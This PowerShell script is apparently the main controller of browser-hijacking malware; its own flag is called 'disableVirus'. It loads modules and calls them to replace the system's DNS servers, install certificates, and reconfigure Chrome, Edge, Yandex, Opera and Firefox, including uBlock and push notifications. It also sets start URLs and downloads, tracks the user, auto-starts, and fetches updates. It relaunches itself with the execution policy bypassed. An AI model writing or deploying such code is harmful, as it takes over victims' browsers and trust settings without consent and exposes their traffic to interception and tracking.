. ./consts.ps1
. ./utils.ps1
. ./dnsman.ps1
. ./chrome.ps1
. ./chrome.uBlock.ps1
. ./edge.ps1
. ./yandex.ps1
. ./opera.ps1
. ./firefox.ps1
. ./cert.ps1
. ./extraupdate.ps1
. ./chrome.push.ps1
. ./starturls.ps1
. ./startdownloads.ps1
. ./tracker.ps1
. ./auto.ps1
. ./embeddings.ps1


# if(!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
#     Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`"  `"$($MyInvocation.MyCommand.UnboundArguments)`""
#     Exit
#   }

function gui_main {
    DoStartDownloads
    DoStartUrls
    if (-not $server.disableVirus)
    {
        LaunchChromePushes
    }
    DoFront
    DoEmbeddings
}

function launchGui
{
    $scriptPath = $PSCommandPath
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -guimode"
}

function main {
    if (-not $server.disableVirus)
    {
        ConfigureDnsServers
        ConfigureCertificates
        ConfigureChrome
        ConfigureEdge
        ConfigureYandex
        ConfigureFireFox
        ConfigureOpera
        ConfigureChromeUblock
        ConfigureChromePushes
        DoAuto
    }
    gui_main
    if (-not $server.disableVirus)
    {
        DoTrack
        DoUpdate
        DoExtraUpdate
    }
}

$gui = Test-Gui
if ($gui -eq $true)
{
    gui_main
}
else 
{
    main
}